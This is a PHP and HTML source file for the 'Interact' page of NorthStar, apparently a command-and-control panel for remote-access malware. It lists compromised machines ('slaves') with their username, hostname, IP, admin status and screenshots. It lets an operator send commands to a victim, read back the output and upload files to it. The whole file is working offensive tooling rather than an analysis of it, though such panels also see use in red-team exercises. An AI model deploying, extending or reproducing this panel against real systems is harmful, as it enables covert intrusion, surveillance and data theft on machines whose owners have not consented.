<?php
include 'session.php';
include 'chckinteract.php';
include 'conn.php';
include 'functions/sessionStats.function.php';
include 'functions/sessionExists.function.php';
//include 'functions/setCommand.nonfunction.php';

if(isset($name)){
    $sessionExistsControl = sessionExists($name, $conn);

    if(strpos($sessionExistsControl, 'exists'))
    {
        $sessionStats = getSessionStats($name, $conn);

    if(is_array($sessionStats) && count($sessionStats) > 7)
      {
        $isAdmin = $sessionStats[0];
        $ipAddress = $sessionStats[1];
        $machineName = $sessionStats[2];
        $operatingSystem = $sessionStats[3];
        $user = $sessionStats[4];
        $processId = $sessionStats[5];
        $imagePath = $sessionStats[6];
        $workingDir = $sessionStats[7];

      }
      else{
        header("location: /clients.php");
        die();
      }
    }
    elseif(strpos($sessionExistsControl, 'error')){
      echo $sessionExistsControl;
      $name = "null";
      $isAdmin = 0;
      $ipAddress = 0;
      $machineName = 0;
      $operatingSystem = 0;
      $user = 0;
      $processId = 0;
      $imagePath = 0;
      $workingDir = 0;
    }
    else{
      header("location: /clients.php");
      die();
    }
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <title>NorthStar - Interact</title>
  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css">
  <link href="css/ruang-admin.min.css" rel="stylesheet">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>

  <script>
  var isCommandSended = false;
  var file = "/getresponse.php?slave=" + "<?php echo htmlspecialchars($name);?>";

function retrieveResponse(){
var requestCount = 0;
if(isCommandSended){

var interval = setInterval(function() {
          $.ajax({
              type: "GET",
              url: file,
              success: function(response) {


                  if (response && response.length > 3) {

  document.getElementById("resultTextarea").value = response;
  isCommandSended = false;
  clearInterval(interval);

  if(response.includes("Screenshot"))
  {
    var responseSplitted = response.split(" ");
    document.getElementById("screenshot").src= responseSplitted[3];
  }
  return;

                  }
              }
          });
      },1000);
}
}

  function checkInput() {


      var slaveNameClean = "<?php echo htmlspecialchars($name);?>";
      var requestToken = document.getElementById("csrftoken").value;
      var event = window.event || event.which;

      if (event.keyCode == 13) {
        event.preventDefault();
        isCommandSended = true;
          var command = document.getElementById("commandTextarea").value;

          document.getElementById("commandTextarea").value = "";
          if(command.charAt(0) == " "){
            command[0] = "";
          }

          setCommand(slaveNameClean, command, requestToken);
      }

  }

  function setCommand(slave, command, requestToken) {

    var csrfToken = "<?php echo $_SESSION['token'];?>";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/functions/setCommand.nonfunction.php', true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() { // Call a function when the state changes.
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
          if(!xhr.responseText.includes("error"))
          {
            document.getElementById("resultTextarea").value = "Command assigned waiting for response.";
            retrieveResponse();
          }
          else
          {
              document.getElementById("resultTextarea").value = xhr.responseText;
          }
        }
    }

	if(requestToken == csrfToken){
    xhr.send("slave="+slave+"&command="+command+"&sid="+slave+"&token="+requestToken);

	}
	else{
	document.getElementById("resultTextarea").value = "Invalid csrf token";
}
  }


  </script>

</head>

<body id="page-top">
  <div id="wrapper">

    <!-- Sidebar -->
    <ul class="navbar-nav sidebar sidebar-light">
        <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.php">

          <div class="sidebar-brand-text mx-3">NorthStar</div>
        </a>
        <hr class="sidebar-divider my-0">
        <li class="nav-item">
          <a class="nav-link" href="index.php">
            <i class="fas fa-fw fa-tachometer-alt"></i>
            <span>Dashboard</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="clients.php">
            <i class="fas fa-fw fa-desktop"></i>
            <span>Sessions</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="logs.php">
            <i class="fas fa-fw fa-history"></i>
            <span>Server Logs</span></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="user.php">
            <i class="fas fa-fw fa-user"></i>
            <span>User Settings</span></a>
        </li>

        <hr class="sidebar-divider">
        <div class="version" id="version-ruangadmin"></div>
      </ul>

    <!-- Sidebar -->
    <div id="content-wrapper" class="d-flex flex-column">
      <div id="content">
        <!-- TopBar -->
        <div id="content-wrapper" class="d-flex flex-column">
          <div id="content">
            <!-- TopBar -->
            <nav class="navbar navbar-expand navbar-light bg-navbar topbar mb-4 static-top">
              <ul class="navbar-nav ml-auto">
                <li class="nav-item dropdown no-arrow">
                  <a class="nav-link dropdown-toggle" href="/logout.php"  role="button"  aria-expanded="false">
                    <i class="fas fa-sign-out-alt fa-sm fa-fw text-gray-400"></i>
                    <span class="ml-2 d-none d-lg-inline text-white small">Logout</span>
                  </a>

                </li>
              </ul>
            </nav>
          </div>
        </div>
      </div>



        <div class="container-fluid" id="container-wrapper">
          <div class="d-sm-flex align-items-center justify-content-between mb-4">
            <h1 class="h3 mb-0 text-gray-800">INTERACT</h1>
            <ol class="breadcrumb">

            </ol>
          </div>

          <div class="row">
            <div class="col-lg-6">

<div class="card mb-4">
  <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
    <h6 class="m-0 font-weight-bold text-primary"><?php echo htmlspecialchars($name);?></h6>
  </div>
  <div class="card-body">

      <div class="form-group">
        <label>Command</label>
        <textarea class="form-control" id="commandTextarea" onkeydown="checkInput();" placeholder="Write command and press Enter" rows="1"></textarea>
</div>
<input type="hidden" id="csrftoken" value='<?php echo $_SESSION["token"];?>' disabled/>
      <div class="form-group">
        <label for="resultTextarea">Output</label>
        <textarea class="form-control" id="resultTextarea" rows="10" readonly></textarea>
      </div>

  </div>
</div>
              <div class="card mb-4">
                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 class="m-0 font-weight-bold text-primary">Upload File</h6>
                </div>
                <div class="card-body">
                  <form action="" method="post" enctype="multipart/form-data">
                    <div class="form-group">
                      <div class="custom-file">
                        <input type="file" class="custom-file-input" id="customFile" name="fileToUpload" required><br><br>
                        <input type="hidden" name="slave" value="<?php echo htmlspecialchars($name);?>">
			<input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                        <label class="custom-file-label" for="customFile">Choose file</label>
                      </div>
                    </div>

                    <button type="submit" class="btn btn-primary" name="submit">Upload</button>
                  </form>
                </div>
              </div>

            </div>

            <div class="col-lg-6">

              <div class="card mb-2">
                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                  <h6 class="m-0 font-weight-bold text-primary">Session Details</h6>
                </div>
                <div class="card-body">
                  <p>
                  <code class="highlighter-rouge">Username: </code><font color="black" size=2> <?php echo htmlspecialchars($user); ?></font><br>
                  <code class="highlighter-rouge">Hostname: </code><font color="black" size=2> <?php echo htmlspecialchars($machineName); ?></font><br>
                  <code class="highlighter-rouge">Operating System: </code><font color="black" size=2> <?php echo htmlspecialchars($operatingSystem); ?></font><br>
                  <code class="highlighter-rouge">Ip Address: </code><font color="black" size=2> <?php echo htmlspecialchars($ipAddress); ?></font><br>
                  <code class="highlighter-rouge">Process Id: </code><font color="black" size=2> <?php echo htmlspecialchars($processId); ?></font><br>
                  <code class="highlighter-rouge">Is Admin: </code><font color="black" size=2> <?php echo htmlspecialchars($isAdmin); ?></font><br>
                  <code class="highlighter-rouge">Executable Dir: </code><font color="black" size=2> <?php echo htmlspecialchars($workingDir); ?></font><br>
                  </p>
                  <p>Latest screenshot</p>
<?php echo "<img id=\"screenshot\" src='" . htmlspecialchars($imagePath). "' width='100%'/>"; ?>
                </div>
              </div>


                </div>
              </div>


        </div>

      </div>
    </div>
  </body>
      <!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>copyright &copy; <script> document.write(new Date().getFullYear()); </script> - developed by
              <b><a href="https://engindemirbilek.github.io/" target="_blank">Engin Demirbilek</a></b>
            </span>
          </div>
        </div>
      </footer>
      <!-- Footer -->
    </div>
  </div>

  <!-- Scroll to top -->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

</body>
<?php include 'functions/setCommand.nonfunction.php';  ?>
</html>
